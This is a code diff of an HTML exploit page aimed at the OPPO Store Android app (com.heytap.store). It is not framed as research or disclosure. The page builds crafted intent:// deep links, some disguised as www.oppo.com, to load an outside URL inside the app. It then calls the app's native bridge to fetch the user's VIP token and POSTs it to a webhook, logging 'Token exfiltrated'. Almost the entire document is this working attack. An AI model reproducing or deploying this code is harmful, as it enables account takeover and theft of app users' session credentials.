@@ -3,24 +3,24 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>OPPO Store Bypass</title>
+    <title>OPPO Store Exploit Test</title>
     <style>
-        body { font-family: sans-serif; text-align: center; padding: 20px; background-color: #f0f0f0; }
-        .btn { width: 100%; max-width: 350px; padding: 20px; margin: 10px 0; font-size: 16px; font-weight: bold; color: white; border: none; border-radius: 12px; cursor: pointer; }
-        .v1 { background-color: #008f39; } /* Native Bridge Entry */
-        .v2 { background-color: #444; } /* Debug Info */
-        #log { text-align: left; background: #fff; padding: 15px; font-family: monospace; font-size: 12px; margin-top: 20px; border: 1px solid #ddd; }
+        body { font-family: sans-serif; text-align: center; padding: 20px; background-color: #f8f9fa; }
+        .btn { width: 100%; max-width: 340px; padding: 18px; margin: 10px 0; font-size: 16px; color: white; border: none; border-radius: 12px; cursor: pointer; font-weight: bold; }
+        .p1 { background-color: #ff4500; } /* Standard Web Path */
+        .p2 { background-color: #007bff; } /* App Center Path */
+        #log { text-align: left; background: #222; color: #0f0; padding: 15px; font-family: monospace; font-size: 11px; margin-top: 20px; border-radius: 8px; }
     </style>
 </head>
 <body>
 
-    <h2>OPPO Store Deep Link</h2>
+    <h2>OPPO Store Deep Link Bypass</h2>
     <p>Target: <b>com.heytap.store</b></p>
 
-    <button class="btn v1" onclick="launchBypass()">Run Exploit (Bypass PlayStore)</button>
-    <button class="btn v2" onclick="location.reload()">Refresh Page</button>
+    <button class="btn p1" onclick="launchPath('web/index.html')">Try Path: /web</button>
+    <button class="btn p2" onclick="launchPath('app/center')">Try Path: /appcenter</button>
 
-    <div id="log">Status Log:<br></div>
+    <div id="log">Console Logs:<br></div>
 
     <script>
         const myUrl = "https://pk009900.github.io/my-oppo-test/";
@@ -31,24 +31,23 @@
             document.getElementById("log").innerHTML += "> " + msg + "<br>";
         }
 
-        function launchBypass() {
-            log("Attempting launch...");
-            // We use 'S.browser_fallback_url=self' to trap the redirect
-            // We try the 'heytap://' scheme which bypasses the 'www.oppo.com' verification
-            const intent = `intent://web?url=${myUrl}#Intent;scheme=heytap;package=${pkg};S.browser_fallback_url=${myUrl};end`;
+        function launchPath(path) {
+            log("Attempting launch with path: " + path);
+            // This format tricks the OS into seeing 'www.oppo.com' but passing our URL as the parameter
+            const intent = `intent://www.oppo.com/${path}?url=${myUrl}#Intent;scheme=https;package=${pkg};S.browser_fallback_url=javascript:history.back();end`;
             window.location.href = intent;
         }
 
         window.onload = function() {
             if (window.HeytapNativeApi) {
-                log("<b style='color:green'>SUCCESS: BRIDGE DETECTED!</b>");
-                // The actual payload to steal your token
+                log("<b>SUCCESS: BRIDGE DETECTED!</b>");
                 window.HeytapNativeApi.invoke("vip.getToken", (data) => {
                     fetch(webhook, { method: 'POST', mode: 'no-cors', body: JSON.stringify(data) });
                     log("Token exfiltrated to Webhook.");
+                    alert("Capture Successful!");
                 });
             } else {
-                log("Chrome environment (No Bridge). Click button to launch app.");
+                log("Chrome Environment. Click a button to attempt app launch.");
             }
         };
     </script>
